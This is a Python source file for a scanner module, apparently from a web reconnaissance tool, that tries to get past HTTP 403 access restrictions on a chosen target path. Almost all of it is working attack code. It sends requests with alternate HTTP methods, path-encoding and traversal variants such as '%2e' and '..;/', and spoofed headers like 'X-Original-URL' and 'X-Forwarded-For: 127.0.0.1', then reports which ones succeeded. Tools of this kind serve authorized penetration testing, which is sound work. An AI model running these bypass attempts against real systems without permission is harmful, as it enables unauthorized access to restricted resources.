import collections
import copy
import time
import requests
from urllib3.exceptions import HTTPError

from .base_scanner import Scanner
from .utils import *
from typing import Any, Dict, List


#   --------------------------------------------------------------------------------------------------------------------
#
#   Attempt to bypass 403 using different methods
#
#   Ⓒ                                                                                                                Ⓒ
#   Ⓒ    This module was written in Python in order to integrate better with WebRecon, most methods were taken from  Ⓒ
#   Ⓒ    from this repo     ->      https://github.com/iamj0ker/bypass-403                                           Ⓒ
#   Ⓒ                                                                                                                Ⓒ
#
#   --------------------------------------------------------------------------------------------------------------------


class Bypass403(Scanner):
    SCAN_NICKNAME = ScannerNames.BypassScan
    _SCAN_COLOR = OutputColors.Blue
    _WRITE_RESULTS = False
    _SUPPORTS_CACHE = False
    _FOUND = 0

    def __init__(self, target_keyword, *args, **kwargs):
        self.target_keyword = target_keyword.strip("/")

        super().__init__(*args, **kwargs)
        self.target_url = self.target_url.strip("/")

    def try_bypass(self) -> dict:
        results = collections.defaultdict(list)

        # methods

        req_path = f"{self.target_url}/{self.target_keyword}"
        results[self.send_request("GET", req_path)].append(f"GET {req_path}")

        req_path = f"{self.target_url}/{self.target_keyword}"
        headers = {"Content-Length": "0"}
        results[self.send_request("POST", req_path, headers=headers)].append(f"POST {req_path} -H 'Content-Length: 0'")

        req_path = f"{self.target_url}/{self.target_keyword}"
        headers = {"Content-Length": "0"}
        results[self.send_request("PUT", req_path, headers=headers)].append(f"PUT {req_path} -H 'Content-Length: 0'")

        req_path = f"{self.target_url}/{self.target_keyword}"
        results[self.send_request("TRACE", req_path)].append(f"TRACE {req_path}")

        req_path = f"{self.target_url}/{self.target_keyword}"
        results[self.send_request("DELETE", req_path)].append(f"DELETE {req_path}")

        # encoding / path traversal

        req_path = f"{self.target_url}/%2e/{self.target_keyword}"
        results[self.send_request("GET", req_path)].append(f"GET {req_path}")

        req_path = f"{self.target_url}/{self.target_keyword}/."
        results[self.send_request("GET", req_path)].append(f"GET {req_path}")

        req_path = f"{self.target_url}//{self.target_keyword}//"
        results[self.send_request("GET", req_path)].append(f"GET {req_path}")

        req_path = f"{self.target_url}/./{self.target_keyword}/./"
        results[self.send_request("GET", req_path)].append(f"GET {req_path}")

        req_path = f"{self.target_url}/{self.target_keyword}..;/"
        results[self.send_request("GET", req_path)].append(f"GET {req_path}")

        req_path = f"{self.target_url}/{self.target_keyword};/"
        results[self.send_request("GET", req_path)].append(f"GET {req_path}")

        req_path = f"{self.target_url}/{self.target_keyword}%20"
        results[self.send_request("GET", req_path)].append(f"GET {req_path}")

        req_path = f"{self.target_url}/{self.target_keyword}%09"
        results[self.send_request("GET", req_path)].append(f"GET {req_path}")

        req_path = f"{self.target_url}/{self.target_keyword}?"
        results[self.send_request("GET", req_path)].append(f"GET {req_path}")

        req_path = f"{self.target_url}/{self.target_keyword}#"
        results[self.send_request("GET", req_path)].append(f"GET {req_path}")

        req_path = f"{self.target_url}/{self.target_keyword}/*"
        results[self.send_request("GET", req_path)].append(f"GET {req_path}")

        # file extensions

        req_path = f"{self.target_url}/{self.target_keyword}.html"
        results[self.send_request("GET", req_path)].append(f"GET {req_path}")

        req_path = f"{self.target_url}/{self.target_keyword}.php"
        results[self.send_request("GET", req_path)].append(f"GET {req_path}")

        req_path = f"{self.target_url}/{self.target_keyword}.json"
        results[self.send_request("GET", req_path)].append(f"GET {req_path}")

        # headers

        req_path = f"{self.target_url}/{self.target_keyword}"
        headers = {"X-Original-URL": self.target_keyword}
        results[self.send_request("GET", req_path,
                                  headers=headers)].append(f"GET {req_path} -H 'X-Original-URL: {self.target_keyword}'")

        req_path = f"{self.target_url}/{self.target_keyword}"
        headers = {"X-Custom-IP-Authorization": "127.0.0.1"}
        results[self.send_request("GET", req_path,
                                  headers=headers)].append(f"GET {req_path} -H 'X-Custom-IP-Authorization: 127.0.0.1'")

        req_path = f"{self.target_url}/{self.target_keyword}"
        headers = {"X-Forwarded-For": "http://127.0.0.1"}
        results[self.send_request("GET", req_path,
                                  headers=headers)].append(f"GET {req_path} -H 'X-Forwarded-For: http://127.0.0.1'")

        req_path = f"{self.target_url}/{self.target_keyword}"
        headers = {"X-Forwarded-For": "127.0.0.1:80"}
        results[self.send_request("GET", req_path,
                                  headers=headers)].append(f"GET {req_path} -H 'X-Forwarded-For: 127.0.0.1:80'")

        req_path = f"{self.target_url}"
        headers = {"X-rewrite-url": self.target_keyword}
        results[self.send_request("GET", req_path,
                                  headers=headers)].append(f"GET {req_path} -H 'X-rewrite-url: {self.target_keyword}'")

        req_path = f"{self.target_url}/{self.target_keyword}"
        headers = {"X-Host": "127.0.0.1"}
        results[self.send_request("GET", req_path, headers=headers)].append(f"GET {req_path} -H 'X-Host: 127.0.0.1'")

        return results

    def send_request(self, method, path, headers=None) -> int:
        response = str()
        time.sleep(self.request_cooldown)
        try:
            response = self._make_request(method=method, url=path, headers=headers,
                                          allow_redirects=True).status_code
        except (requests.exceptions.ConnectionError, requests.exceptions.ConnectTimeout,
                requests.exceptions.ReadTimeout, HTTPError):
            pass
        except requests.exceptions.TooManyRedirects:
            self._log_exception(requests.exceptions.TooManyRedirects.__name__, abort=False)
            return ScannerDefaultParams.TooManyRedirectsSCode
        return response

    def _start_scanner(self, results_filename=None) -> Dict[int, List[str]]:
        success_results = dict()
        self._log_status(OutputStatusKeys.State, OutputValues.StateRunning)
        all_results = self.try_bypass()

        success = False
        for scode in ScannerDefaultParams.SuccessStatusCodes:
            success_results[scode] = copy.deepcopy(all_results[scode])
            if len(all_results[scode]):
                success = True
        if success:
            self._log_progress(f"success -> {self.target_keyword}")
            Bypass403._FOUND += 1
        else:
            self._log_progress(f"failed -> {self.target_keyword}")
        self._log_status(OutputStatusKeys.Found, Bypass403._FOUND)

        return success_results

    def _define_status_output(self) -> Dict[str, Any]:
        status = super()._define_status_output()
        status[OutputStatusKeys.Current] = f"{self.target_url}/{self.target_keyword}"
        status[OutputStatusKeys.Found] = Bypass403._FOUND

        return status


if __name__ == "__main__":
    bruter = Bypass403("host", "endpoint")
    x = bruter.start_scanner()
    print(x)
